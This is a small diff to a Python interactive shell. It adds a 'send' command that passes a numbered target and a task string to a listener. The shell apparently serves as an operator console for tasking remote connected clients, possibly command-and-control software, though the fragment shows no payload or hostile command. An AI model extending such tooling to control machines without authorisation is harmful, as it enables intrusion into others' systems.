@@ -19,6 +19,10 @@ class Shell(cmd.Cmd):
 		for r in listener.check():
 			print("\t".join(r))
 
+	def do_send(self, line):
+		parameters = line.split()
+		print(listener.sendTask(int(parameters[0]), parameters[1]))
+
 	def do_exit(self, line):
 		listener.stop()
 		listener.join()
